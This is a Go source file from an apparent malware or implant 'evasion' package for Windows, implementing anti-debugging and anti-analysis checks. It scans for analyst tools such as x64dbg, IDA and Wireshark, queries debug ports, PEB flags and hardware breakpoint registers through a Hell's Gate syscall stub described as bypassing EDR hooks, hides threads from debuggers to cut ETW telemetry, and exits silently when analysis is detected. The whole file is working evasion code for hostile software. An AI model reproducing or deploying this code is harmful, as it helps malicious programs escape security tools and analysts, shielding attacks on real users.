//go:build windows
// +build windows

package evasion

import (
	"os"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var debuggerProcesses = []string{
	"x64dbg.exe", "x32dbg.exe", "windbg.exe", "ollydbg.exe",
	"ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
	"processhacker.exe", "procmon.exe", "procmon64.exe",
	"procexp.exe", "procexp64.exe",
	"wireshark.exe", "fiddler.exe", "dnspy.exe",
	"cheatengine.exe", "cheatengine-x86_64.exe",
	"scylla.exe", "scylla_x64.exe", "scylla_x86.exe",
	"pestudio.exe", "die.exe", "exeinfope.exe",
}

var (
	antiDebugK32Once sync.Once
	antiDebugK32Mod  *windows.LazyDLL

	procIsDbgPresentOnce sync.Once
	procIsDbgPresent     *windows.LazyProc

	procCheckRDbgOnce sync.Once
	procCheckRDbg     *windows.LazyProc

	procGetCurProcOnce sync.Once
	procGetCurProc     *windows.LazyProc
)

func getAntiDebugK32() *windows.LazyDLL {
	antiDebugK32Once.Do(func() { antiDebugK32Mod = windows.NewLazySystemDLL(sKernel32()) })
	return antiDebugK32Mod
}

func getProcIsDebuggerPresent() *windows.LazyProc {
	procIsDbgPresentOnce.Do(func() { procIsDbgPresent = getAntiDebugK32().NewProc(sIsDebuggerPresent()) })
	return procIsDbgPresent
}

func getProcCheckRemoteDbg() *windows.LazyProc {
	procCheckRDbgOnce.Do(func() { procCheckRDbg = getAntiDebugK32().NewProc(sCheckRemoteDebuggerPresent()) })
	return procCheckRDbg
}

func getProcGetCurrentProcess() *windows.LazyProc {
	procGetCurProcOnce.Do(func() { procGetCurProc = getAntiDebugK32().NewProc(sGetCurrentProcess()) })
	return procGetCurProc
}

func isDebuggerPresentWin() bool {
	r, _, _ := getProcIsDebuggerPresent().Call()
	return r != 0
}

func isRemoteDebuggerPresent() bool {
	hProc, _, _ := getProcGetCurrentProcess().Call()
	if hProc == 0 {
		return false
	}
	var present int32
	getProcCheckRemoteDbg().Call(hProc, uintptr(unsafe.Pointer(&present)))
	return present != 0
}

func isDebuggerProcessRunning() bool {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return false
	}

	for {
		name := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
		for _, bad := range debuggerProcesses {
			if name == bad {
				return true
			}
		}
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}
	return false
}

// timingCheck detects single-step debugging by measuring a tight sleep.
// Under a debugger the elapsed time is many times longer than the requested delay.
func timingCheck() bool {
	before := time.Now()
	time.Sleep(1 * time.Millisecond)
	elapsed := time.Since(before)
	return elapsed > 500*time.Millisecond
}

// ntQueryDebugPort checks ProcessDebugPort (class 7) via NtQueryInformationProcess
// using a Hell's Gate stub — bypasses any EDR hook on the Win32 API layer.
func ntQueryDebugPort() bool {
	proc := NewHGProc(sNtQueryInformationProcess())
	if proc == nil {
		return false
	}
	hProc, _, _ := getProcGetCurrentProcess().Call()
	if hProc == 0 {
		return false
	}
	var debugPort uintptr
	const ProcessDebugPort = 7
	r1, _, _ := proc.Call(
		hProc,
		uintptr(ProcessDebugPort),
		uintptr(unsafe.Pointer(&debugPort)),
		unsafe.Sizeof(debugPort),
		0,
	)
	// NTSTATUS 0 = success; non-zero debugPort means debugger attached
	return r1 == 0 && debugPort != 0
}

// ntGlobalFlagCheck reads PEB.NtGlobalFlag — set to 0x70 by the Windows loader
// when the process was created under a debugger (via CREATE_PROCESS_DEBUG_EVENT).
// Bit mask 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK |
// FLG_HEAP_VALIDATE_PARAMETERS.
// PEB+0xBC is the NtGlobalFlag field on x64 Windows 10+.
func ntGlobalFlagCheck() bool {
	peb := getPEB()
	if peb == 0 {
		return false
	}
	ntGlobalFlag := *(*uint32)(unsafe.Pointer(peb + 0xBC))
	return (ntGlobalFlag & 0x70) == 0x70
}

// ntQueryNoDebugInherit checks ProcessDebugFlags (class 0x1F): returns 0 when
// the process was created with DEBUG_ONLY_THIS_PROCESS / inherits a debugger.
func ntQueryNoDebugInherit() bool {
	proc := NewHGProc(sNtQueryInformationProcess())
	if proc == nil {
		return false
	}
	hProc, _, _ := getProcGetCurrentProcess().Call()
	if hProc == 0 {
		return false
	}
	var flags uint32 = 1 // assume no-inherit by default
	const ProcessDebugFlags = 0x1F
	r1, _, _ := proc.Call(
		hProc,
		uintptr(ProcessDebugFlags),
		uintptr(unsafe.Pointer(&flags)),
		unsafe.Sizeof(flags),
		0,
	)
	// flags == 0 means EPROCESS.NoDebugInherit is clear → debugger present
	return r1 == 0 && flags == 0
}

// ntQueryHWBP checks hardware breakpoint registers DR0–DR3 via
// NtGetContextThread. Any non-zero DR register means a debugger has set a
// hardware breakpoint — something sandboxes do to intercept API calls.
func ntQueryHWBP() bool {
	proc := NewHGProc(sNtGetContextThread())
	if proc == nil {
		return false
	}

	// CONTEXT_DEBUG_REGISTERS = 0x00010010 (x64)
	const contextDebugRegisters = 0x00010010
	const contextSize = 0x4D0 // sizeof(CONTEXT) on x64

	// Allocate 16-byte-aligned CONTEXT on the heap to satisfy CONTEXT alignment
	// requirement (CONTEXT must be 16-byte-aligned on x64).
	raw := make([]byte, contextSize+16)
	offset := uintptr(unsafe.Pointer(&raw[0])) & 0xF
	if offset != 0 {
		offset = 16 - offset
	}
	ctx := uintptr(unsafe.Pointer(&raw[offset]))

	// Set ContextFlags before the call.
	*(*uint32)(unsafe.Pointer(ctx)) = contextDebugRegisters

	// NtGetContextThread(CurrentThread=-2, PCONTEXT)
	const ntCurrentThread = ^uintptr(1) // (HANDLE)-2
	r1, _, _ := proc.Call(ntCurrentThread, ctx)
	if r1 != 0 {
		return false
	}

	// DR0–DR3 are at CONTEXT offsets 0x50–0x68 on x64.
	dr0 := *(*uintptr)(unsafe.Pointer(ctx + 0x50))
	dr1 := *(*uintptr)(unsafe.Pointer(ctx + 0x58))
	dr2 := *(*uintptr)(unsafe.Pointer(ctx + 0x60))
	dr3 := *(*uintptr)(unsafe.Pointer(ctx + 0x68))
	return dr0|dr1|dr2|dr3 != 0
}

// hideThreadFromDebugger sets the ThreadHideFromDebugger flag on the current
// thread via NtSetInformationThread.  This makes the thread invisible to
// debugger-attach notifications at the kernel level and reduces ETW-TI
// telemetry surfaced for this thread.
func hideThreadFromDebugger() {
	proc := NewHGProc(sNtSetInformationThread())
	if proc == nil {
		return
	}
	const (
		threadHideFromDebugger = 17
		ntCurrentThread        = ^uintptr(1) // (HANDLE)-2
	)
	proc.Call(ntCurrentThread, uintptr(threadHideFromDebugger), 0, 0)
}

// evadeDebugger exits silently if a debugger is detected via any method.
func evadeDebugger() {
	if isDebuggerPresentWin() ||
		isRemoteDebuggerPresent() ||
		isDebuggerProcessRunning() ||
		timingCheck() ||
		rdtscTimingCheck() ||
		ntQueryDebugPort() ||
		ntQueryNoDebugInherit() ||
		ntGlobalFlagCheck() ||
		ntQueryHWBP() {
		os.Exit(0)
	}
}
